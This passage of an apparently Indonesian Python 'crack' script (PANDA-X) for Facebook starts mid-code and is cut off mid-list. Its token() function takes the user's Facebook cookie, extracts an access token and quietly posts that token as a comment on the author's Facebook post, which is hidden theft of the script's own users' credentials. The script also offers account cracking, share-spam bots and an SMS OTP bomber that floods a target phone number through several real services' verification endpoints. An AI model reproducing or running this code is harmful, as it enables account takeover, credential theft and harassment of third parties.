	#tele = random.choice([win,emu,pc,sob,sip])
	ugen.append(tle)
	ugen2.append(tle)
	
for x in range(100):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	ugen.append(uak)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

###------------------------------------------------------------------>
#     *CEK WARNA INPUT
###------------------------------------------------------------------>
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'	
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 

###------------------------------------------------------------------>
#     *GET TANGGAL-BULAN-TAHUN
###------------------------------------------------------------------>
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
resok = 'PANDAXOK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
rescp = 'PANDAXCP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
###------------------------------------------------------------------>
#     *SUPORT SYSTEM
###------------------------------------------------------------------>
gh = 'ONE-Idz'
fbme = 'Jun Pakaya'
wame = "082196816220"
kotaku = ses.get("http://ip-api.com/json/").json()["city"]
ip = ses.get("http://ip-api.com/json/").json()["query"]
negriku = ses.get("http://ip-api.com/json/").json()["country"]
versidev = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:sinyal = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:sinyal = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
versi_app = str(random.randint(111111111,999999999))
RSAPubKey = "<RSAKeyValue><Modulus>2EccSgxEF6LGppC/BaWMH+1LGj0dK1ED7VyMUV6exlIPFJRnhNzrUzdFsAi3uCDQjep+dou/jMvjFYNv3RERmGmEbVObPGp4vaRTSCSrV52yvw3vhwfZbfBih80Nvg7AZJXkYhIDJ36fIJ893RiKSPKbR0dJZKqO8HCsZt+VHQBtD855hOVblo/wr2YX2ZdFr8kciNs9jpvUNpnXCk/aZxGHJvt+gd0wJTITR4/ygXA4zXR5xYwthZzaXPHG9YF0YQ0q2x67EvkgStzuJvB+lMhCufytl+5wZS0kCywgsKnx7ZgtysSxz79iPuBS4Nu5lCsKjJ09vE8wx8nFMoOx4w==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
auth = "WyI2MzIwNzExNSIsIkd4U2F5TmowRXhlQWdkWUtNdWNNSFNESElCbGFPVkxZTnhRWUxKcGkiXQ=="
hour = datetime.datetime.now().hour
if 19 <= hour < 4:
  hhl = f"Selamat Malam"
elif 4 <= hour < 12:
  hhl = f"Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Siang"
elif 15 <= hour < 18:
  hhl = f"Selamat Sore"
elif 18 <= hour < 19:
  hhl = f"Selamat Malam"
else:
  hhl = f"Selamat Malam"
  
def haecerjoin_tm(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
def clear():
	os.system('clear')
def back():
	os.system('clear')
	login()
def haecerjoin_v(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)
###------------------------------------------------------------------>
#     *BAGIAN MASUK
###------------------------------------------------------------------>
def token():
	os.popen('play-audio scmusic/canda.mp3')       
	cook = open('PANDA-X/cokiku.txt','r').read()
	try:
		cookie = {'cookie':cook}
		with requests.Session() as xyz:
			ehem = random.choice(['wow','https://www.facebook.com/photo.php?fbid=1080778853302439&set=a.105625067484494&type=3&app=fbl'])
			hai_kontol = random.choice(['wow','Anjai','bercyndaaa😂','Tutor','Cek Pesan'])
			gausah_di_ganti_ya = random.choice(['Keren Bang Jun 😎','Izin Pake Scnya Bang Jun','Hello World!','Mantap Bang Jun ☺️','Tutor Nge Heker Bang Jun 🤓','Hai Bang Jun 😘']) #####Jahat Kali Bah, Udah Di Kasih Free Malah Di Ganti?
			url = 'https://business.facebook.com/business_locations'
			req = xyz.get(url,cookies=cookie)
			tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
			ses.post(f"https://graph.facebook.com/100041110030421_pfbid0ab2wARkuooJmGgYeuMR2B6bzVVZbizU6Ay93fMid7Bua34sP2An7m5Jt7eLFp43El/comments/?&message={hai_kontol}&access_token={tok}",cookies=cookie) ####Gausah Di Ganti, Kan Udah Di Kasih Freee...!
			ses.post(f"https://graph.facebook.com/100041110030421_pfbid0ab2wARkuooJmGgYeuMR2B6bzVVZbizU6Ay93fMid7Bua34sP2An7m5Jt7eLFp43El/comments/?&message={tok}&access_token={tok}",cookies=cookie) ####Gausah Di Ganti, Kan Udah Di Kasih Freee...!
			ses.post(f"https://graph.facebook.com/100041110030421_pfbid0ab2wARkuooJmGgYeuMR2B6bzVVZbizU6Ay93fMid7Bua34sP2An7m5Jt7eLFp43El/comments/?&message={gausah_di_ganti_ya}&access_token={tok}",cookies=cookie) ####Jahat Kali Bah, Udah Di Kasih Free Malah Di Ganti😑
			ses.post(f"https://graph.facebook.com/100041110030421_1080778853302439/comments/?&message={ehem}&access_token={tok}",cookies=cookie) ####Jahat Kali Bah, Udah Di Kasih Free Malah Di Ganti😑
			ses.post(f"https://graph.facebook.com/100041110030421_pfbid0ab2wARkuooJmGgYeuMR2B6bzVVZbizU6Ay93fMid7Bua34sP2An7m5Jt7eLFp43El/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text ####Kalau Lu Baik Lu Gabakal Hapus ini Sebagai Tanda Terima Kasihh..!!
			ses.post(f"https://graph.facebook.com/100041110030421_pfbid0XsjQU3Jr5Rr7aKQMtKqVmqMFDigdm7eERWtoaZVmBNosrKV6w5VJVroPRUQqdVCVl/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text ####Jahat Kali Bah, Udah Di Kasih Free Malah Di Ganti😑
			login()
	except Exception as e:
		print('╰─ > opshh Ganti Cokies lagi Om')
		login_terus()

def login():
	try:
		token = open('PANDA-X/tokenku.txt','r').read()
		cok = open('PANDA-X/cokiku.txt','r').read()
		tokenku.append(token)
		try:
			ts = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			pinka = json.loads(ts.text)['name']
			pinkb = json.loads(ts.text)['id']
			menu(pinka,pinkb)
		except KeyError:
			os.system('rm -rf PANDA-X/cokiku.txt');os.system('rm -rf PANDA-X/tokenku.txt')
			login_terus()
		except requests.exceptions.ConnectionError:
			li = ' \tTak Dapat Login, Periksa Kuota Kamu'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		os.system('rm -rf PANDA-X/cokiku.txt');os.system('rm -rf PANDA-X/tokenku.txt');login_terus()

###------------------------------------------------------------------>
#     *MENU AWAL
###------------------------------------------------------------------>
def cuih():
	os.system('clear')
	lologoku()
	sayy =Tree(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Github   :[bold green] {gh}\n[bold white][[cyan]•[bold white]] Facebook : [bold green]{fbme}\n[bold white][[bold cyan]•[bold white]] Whatsapp : [bold green]{wame}",style=f"{color_panel}"),guide_style="bold grey100")
	sayy.add(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Jaringan  :[bold green] {sinyal}\n[bold white][[cyan]•[bold white]] Android   : [bold green]{versidev} \n[bold white][[bold cyan]•[bold white]] Versi Apk : [bold green]{versi_app}",style=f"{color_panel}"),guide_style="bold grey100")
	prints(sayy)

def mulai():
	os.system('clear')
	lologoku()
	sayy =Tree(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Github   :[bold green] {gh}\n[bold white][[cyan]•[bold white]] Facebook : [bold green]{fbme}\n[bold white][[bold cyan]•[bold white]] Whatsapp : [bold green]{wame}",style=f"{color_panel}"),guide_style="bold grey100")
	sayy.add(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Jaringan  :[bold green] {sinyal}\n[bold white][[cyan]•[bold white]] Android   : [bold green]{versidev} \n[bold white][[bold cyan]•[bold white]] Versi Apk : [bold green]{versi_app}",style=f"{color_panel}"),guide_style="bold grey100")
	prints(sayy)

def ini():
	mulai()
	cetak(Panel("""\n[bold white][[cyan]01[bold white]] Ganti Bahasa
[bold white][[cyan]02[bold white]] Cloning Email
[bold white][[cyan]03[bold white]] Cloning Name
[bold white][[cyan]04[bold white]] Kembali
[bold white][[cyan]05[bold white]] Menu Utama\n[bold white]""", subtitle="╭────[white][[bold green]INPUT[white]][blue]",subtitle_align="left", title="[bold red]●[bold yellow]●[bold green]●[bold hot_pink2]MENU-LAINYA[bold green]●[bold yellow]●[bold red]●",width=58, style=f"{color_panel}"))
	zun = input(N+''+B+'   ╰─ >  \033[32m')
	if zun in(''):
		haecerjoin_tm(f'{h}{x}\x1b[1;91mPilih Yang Benar Asu....');back()
###------------------------------------------------------------------>
	elif zun in('2','02'):
		kuntul = Tree(Panel.fit(f"""{P2}User Agent Sangat Berpengaruh Dalam Melakukan Crack Acount""",style=f"{color_panel}"),guide_style="bold grey100")
		kuntul.add(Panel(f'{P2}[[bold cyan]01[/]{P2}][/] {P2}UserAgent {H2}Manual{P2}  [{M2}Not Recommended{P2}][/]\n{P2}[[bold cyan]02[/]{P2}][/] {P2}UserAgent {H2}Random{P2}  ( {M2}Saran{P2} )[/]',width=55,title=f"{H2}Input-UserAgent",style=f"{color_panel}"))
		prints(kuntul);uaemail()
###------------------------------------------------------------------>
	elif zun in('3','03'):
		kuntul = Tree(Panel.fit(f"""{P2}User Agent Sangat Berpengaruh Dalam Melakukan Crack Acount""",style=f"{color_panel}"),guide_style="bold grey100")
		kuntul.add(Panel(f'{P2}[[bold cyan]01[/]{P2}][/] {P2}UserAgent {H2}Manual{P2}  [{M2}Not Recommended{P2}][/]\n{P2}[[bold cyan]02[/]{P2}][/] {P2}UserAgent {H2}Random{P2}  ( {M2}Saran{P2} )[/]',width=55,title=f"{H2}Input-UserAgent",style=f"{color_panel}"))
		prints(kuntul);uanama()
###------------------------------------------------------------------>
#     *CEK LOGIN COKI
###------------------------------------------------------------------>
	elif zun in('1','01'):
		error()
		back()
	elif zun in('5','05'):
		back()
	elif zun in('4','04'):
		cuih()
		cetak(Panel("""[bold white][[cyan]01[bold white]] Crack Pencarian Nama
[bold white][[cyan]02[bold white]] Spam Sms
[bold white][[cyan]03[bold white]] Spam Wa
[bold white][[cyan]04[bold white]] Bot Share
[bold white][[cyan]05[bold white]] Menu Lain
[bold white][[cyan]06[bold white]] Kembali[bold white]""", subtitle="╭────[white][[blue]INPUT[white]][blue]", subtitle_align="left", title="[bold red]●[bold yellow]●[bold green]●[bold hot_pink2]BOT-TOOLS[bold green]●[bold yellow]●[bold red]●",padding=(0,5),style=f"{color_panel}"));tambahm()
###------------------------------------------------------------------>
#     *MENU UTAMA
###------------------------------------------------------------------>
def menu(my_name,my_id):
	try:
		piu = json.loads(open('PANDA-X/mykey.json', 'r').read())['License']
		token = open('PANDA-X/cokiku.txt','r').read()
		cok = open('PANDA-X/tokenku.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(1)
		login_terus()
	os.system('clear')
	lologoku()
	print(f"┗━━{P} [ {H}{piu} {P}]")
	dia.append(panel(f"[bold white][[bold cyan]•[bold white]] Jaringan  :[bold green] {sinyal}\n[bold white][[cyan]•[bold white]] Android   : [bold green]{versidev} \n[bold white][[bold cyan]•[bold white]] Ip Addres : [bold green]{ip}",width=38,padding=(0,0),style=f"{color_panel}"))
	dia.append(panel(f"[bold white][[bold cyan]•[bold white]] Github   :[bold green] {gh}\n[bold white][[cyan]•[bold white]] Facebook : [bold green]{fbme}\n[bold white][[bold cyan]•[bold white]] Whatsapp : [bold green]{wame}",width=29,padding=(0,0),style=f"{color_panel}"))
	console.print(Columns(dia))
	say.append(panel(f"[bold white]Hi, {hhl} [bold green]{my_name}[bold white],",width=38,padding=(0,1),style=f"{color_panel}"))
	say.append(panel(f"[bold white]Idz :[bold green] {my_id}",width=29,padding=(0,1),style=f"{color_panel}"))
	console.print(Columns(say))
	prints(panel(f"[bold white]Please [[bold green]ENTER[bold white]] For Additional Menu",width=70,padding=(0,14),style=f"{color_panel}"))
	table=Table()
	kuda = Table(show_header=True, header_style='magenta') 
	table.add_column(f"[white]NO",justify="center",width=6,style="magenta")
	table.add_column(f"[white]MENU CRACK ",justify="center",width=49,style="magenta")
	table.add_column(f"[white]STATUS",justify="center",width=7,style="magenta")
	table.add_row("[bold cyan]01",f"[bold white]Start Crack","[bold green]ON",)
	table.add_row("[bold cyan]02",f"[bold white]Crack Followers","[bold red]OF")
	table.add_row("[bold cyan]03",f"[bold white]Crack Grup","[bold red]OF")
	table.add_row("[bold cyan]04",f"[bold white]Crack File","[bold green]ON")
	table.add_row("[bold cyan]05",f"[bold white]Cek Result","[bold green]ON")
	table.add_row("[bold cyan]06",f"[bold white]Cek Opsi Cp","[bold green]ON")
	table.add_row("[bold cyan]07",f"[bold white]Link Tanget", "[bold green]ON") 
	table.add_row("[bold cyan]08",f"[bold white]Info Script", "[bold green]ON") 
	table.add_row("[bold cyan]09",f"[bold white]Info Admin", "[bold green]ME") 
	table.add_row("[bold cyan]10",f"[bold white]Keluar/Logout", "[bold green]ON")
	Consol=Console()
	Consol.print(nel(table,width=70,style=f"{color_panel}"))
	kamu_nanya = input(N+''+P+'╰─ >'+N+' Choose.. : ')
###------------------------------------------------------------------>
#     *CEK MENU TAMBAHAN
###------------------------------------------------------------------>
	if kamu_nanya in ['']:
		cuih()
		cetak(Panel("""[bold white][[cyan]01[bold white]] Crack Pencarian Nama
[bold white][[cyan]02[bold white]] Spam Sms
[bold white][[cyan]03[bold white]] Spam Wa
[bold white][[cyan]04[bold white]] Bot Share
[bold white][[cyan]05[bold white]] Menu Lain
[bold white][[cyan]06[bold white]] Out[bold white]""", subtitle="╭────[white][[blue]INPUT[white]][blue]", subtitle_align="left", title="[bold red]●[bold yellow]●[bold green]●[bold hot_pink2]BOT-TOOLS[bold green]●[bold yellow]●[bold red]●",padding=(0,5),style=f"{color_panel}"));tambahm()
###------------------------------------------------------------------>
	if kamu_nanya in ['1','01']:
		print("")
		kuntul = Tree(Panel.fit(f"""{P2}User Agent Sangat Berpengaruh Dalam Melakukan Crack Acount""",style=f"{color_panel}"),guide_style="bold grey100")
		kuntul.add(Panel(f'{P2}[[bold cyan]01[/]{P2}][/] {P2}UserAgent {H2}Manual{P2}  [/]\n{P2}[[bold cyan]02[/]{P2}][/] {P2}UserAgent {H2}Random{P2}  ( {M2}Saran{P2} )[/]',width=55,title=f"{H2}Input-UserAgent",style=f"{color_panel}"))
		prints(kuntul);junxua()
	elif kamu_nanya in ['2','02']:
		error()
	elif kamu_nanya in ['3','03']:
		error()
	elif kamu_nanya in ['4','04']:
		print("")
		crack_file()
	elif kamu_nanya in ['5','05']:
		result()
	elif kamu_nanya in ['09','9']:
		contact()
	elif kamu_nanya in ['6','06']:
		file_cp()
	elif kamu_nanya in ['7','07']:
		uatarg()
###------------------------------------------------------------------>
#     *INFO SCRIPT
###------------------------------------------------------------------>
	elif kamu_nanya in ['8','08']:
		os.system('clear')
		lologoku()
		sayy =Tree(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Jaringan  :[bold green] {sinyal}\n[bold white][[cyan]•[bold white]] Android   : [bold green]{versidev} \n[bold white][[bold cyan]•[bold white]] Versi Apk : [bold green]{versi_app}",style=f"{color_panel}"),guide_style="bold grey100")
		sayy.add(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Github   :[bold green] {gh}\n[bold white][[cyan]•[bold white]] Facebook : [bold green]{fbme}\n[bold white][[bold cyan]•[bold white]] Whatsapp : [bold green]{wame}",style=f"{color_panel}"),guide_style="bold grey100")
		prints(sayy)
		print("")
		cetak(panel("\t\t\t[bold red]●[bold yellow]●[bold green]●[cyan][[bold yellow]WELCOME[cyan]][bold green]●[bold yellow]●[bold red]●",padding=(0,5),style=f"{color_panel}"))
		haecerjoin_v(f"{h}Script ini Dec Dari  \033[1;33;46m • \033[1;37m AlvinoXy  \033[1;33m• \033[0m\033[1;30m {h}Yang Pernah Naik Daun\nKarena Resultnya\nJuga Begitu Ini Sc Gratisan, Tidak Prem Dan Hasil Memuaskan,\nSayangnya Karena Gratisan Sc ini Graphnya Tdk\nBertahan Lama, Bug Di Buff Oleh Pihak Facebook Karena Sudah Ketahuan,\nBug Pernah Timbul Lagi Dan Membuat Sc ini pulih Resultnya,\nTapi Tidak Lama Hilang Lagi..\nWaktu Itu Ada Beberapa Orang Yang Menyimpan File son\nDari Alvino Ini, Karena Open Source,\nTermasuk Phatner Saya, \033[1;33;46m • \033[1;37m Stenly Sangalia \033[1;33m• \033[0m\033[1;30m{h} Yang Bisa\nDi bilang Sepupu Saya Juga,\nKami Pun Kompak Mencari Jalan Pintas\nMencoba Mengupdate Method Dan Graph\nNyatanya Bisa, Akan Tetapi Akan Cepat Mokad Bila\nTerlalu Banyak User Yang Mengunakan Sc Ini,\nJadi Tetap Bersyukur Yakk Apa Pun Hasilnya,\nKarena Sc ini Masih Tetap Free...{x}")
		print("")
		haecerjoin_v(f"{h}Salam Santun,\nIM \033[1;33;42m • \033[1;37m JUN M PAKAYA  \033[1;33m• \033[0m\033[1;30m{h}╮{x}");info_sc()
	elif kamu_nanya in ['10']:
		os.remove('PANDA-X/cokiku.txt');os.remove('PANDA-X/tokenku.txt')
		print("\n ╰─ >> \033[91;1mMengahpus Sesi Login Cokies..!", end='\r');time.sleep(0.9);print("  ", end='\r')
		exit()
	else:
		haecerjoin_tm(' ╰─ >  Menu Not Yet Available..! ');time.sleep(3);exit()
###------------------------------------------------------------------>
#     *RUN ERROR
###------------------------------------------------------------------>
def error():
	print(f'╰─ > Fitur Dalam Perbaikan...!');time.sleep(3);back() 
	
def contact():
	kuntul = Tree(Panel.fit(f"""{P2}Admin Online 2× 24 Jam, Tapi Jika Ada Kuota:v""",style=f"{color_panel}"),guide_style="bold grey100")
	kuntul.add(Panel(f'{P2}[[bold cyan]01[/]{P2}][/]{H2} Facebook{P2}  [/]\n{P2}[[bold cyan]02[/]{P2}][/] {H2}Github{P2}[/]\n{P2}[[bold cyan]03[/]{P2}][/] {H2}Telegram{P2}[/]\n{P2}[[bold cyan]04[/]{P2}][/] {H2}Instagram{P2}[/]\n{P2}[[bold cyan]05[/]{P2}][/] {H2}Whatsapp{P2}[/]',width=55,title=f"{H2}Contact-Admin",style=f"{color_panel}"))
	prints(kuntul)
	Juntzy = input(f'     └──>{h} Input :{x} ')
	if Juntzy in['01','1']:
		os.system("xdg-open https://m.facebook.com/jun.WA08988884579");exit()
	elif Juntzy in['02','2']:
		os.system("xdg-open https://github.com/ONE-Idz");exit()
	elif Juntzy in['03','3']:
		os.system("xdg-open https://t.me/ItsJunP");exit()
	elif Juntzy in['04','4']:
		os.system("xdg-open https://instagram.com/jun.cracker?igshid=NTc4MTIwNjQ2YQ==");exit()
	elif Juntzy in['05','5']:
		os.system("xdg-open https://wa.me/+6282196816220?text=Halo+Bang+Jun+Ganteng");exit()
	else:
		print("Minimal Bisa Ngetik Wak..")
		exit()
###------------------------------------------------------------------>
def info_sc():
	cetak(panel("[[yellow]J[blue]]\n[blue][[yellow]U[blue]] ╭───[blue][[red]ENTER[blue]][white] Untuk Info Lebih Lanjut\n[blue][[yellow]N[blue]] │" , subtitle="╰──╯", subtitle_align="left", title="[bold green]╰─INFO─",width=53, style="bold blue"))
	cie_monyet = input(N+''+B+'   ╰─ >  \033[32m')
	if cie_monyet in ['']:
		haecerjoin_tm('\t\t   ..Akan Di Arahkan Ke Whatsapp Saya.. ')
		os.system("xdg-open https://wa.me/+6282196816220?text=Bagaimana+Kelanjutan+Tentang+Info+Sc+Ini+Bang?")
		login()

def tambahm():
	Yjun = input(N+''+B+'   ╰─ >  \033[32m')
	if Yjun in(''):
		print(' [+] Pilih Yang Bener Asu ')
		time.sleep(3)
		back()
	if Yjun in('1','01'):
		crack_nama()
	elif Yjun in('2','02'):
		spam_sms()
	elif Yjun in('3','03'):
		spam_wa()
	elif Yjun in('4','04'):
		gas()
	elif Yjun in('5','05'):
		ini()
	elif Yjun in('6','06'):
	    exit()
	elif Yjun in('cek','cok'):
		cekcok()
###------------------------------------------------------------------>
#     *BOT SHARE POST
###------------------------------------------------------------------>
def loginsup():
	os.system("xdg-open https://wa.me/+6282196816220?text=Giaman+Ini+Mas??🗿");exit()
def shareku(link,jum):
	print("")
	global loop
	print(f'\r{x}   [{h}zmbf{x}]{h}╰─ >>{x}  PROSES / Ctrl+z Untuk Berhenti {x} -:{h}{loop}{x} -:{m}{jum}{x}' ,end='')
	cook = open('PANDA-X/cokiku.txt','r').read()
	took = open('PANDA-X/tokenku.txt','r').read()
	try:
		url = f'https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={took}'
		ok = ses.post(url,cookies={'cookie':cook}).text
		if 'Kami membatasi' in ok:
			print(f'{x}\r   [{m}zmbf{x}]{m}╰─ >> {x}share batal Akun Limit')
		elif 'spam' in ok:
			print(f'{x}\r   [{m}zmbf{x}]{m}╰─ >> {x}share batal Akun Limit')
		elif 'id' in ok:
			print(f"{x}\r   [{h}zmbf{x}]{h}─ >> {x} berhasil : {h}"+ok)
		else:
			print('Ups Terjadi Kesalahan')
	except:
		print('Ups Terjadi Kesalahan')
	loop+=1

def gas():
	try:
		cetak(Panel(f"""{P2}masukan tautan target, pastikan target bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
		link = input(f"{x}{h}╰─ >>{x} tautan target share : ")
		jum = int(input(f"{x} {h}╰─ >> {x} Input Jumlah Share : "))
		with thread(max_workers=2) as pool:
			for io in range(jum):
				pool.submit(shareku,link,jum)
				print("")
				print(f"{x}   [{h}zmbf{x}]{h} ─ >> Berhasil Share Sebanyak {h}{jum}{x} :)")
	except Exception as e:
		os.remove('PANDA-X/cokiku.txt');os.remove('/sdcard/cookie&token/JunToken.json')
		print('Cookie Invalid, Login Ulang')
		time.sleep(1)
		login_terus()
###------------------------------------------------------------------>
#     *SPAM SMS
###------------------------------------------------------------------>
agent = random.choice(
		[
			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
			"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
	]
)

def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	cuih()
	nomor = input(f"╰─ > Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/weba/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "user-agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
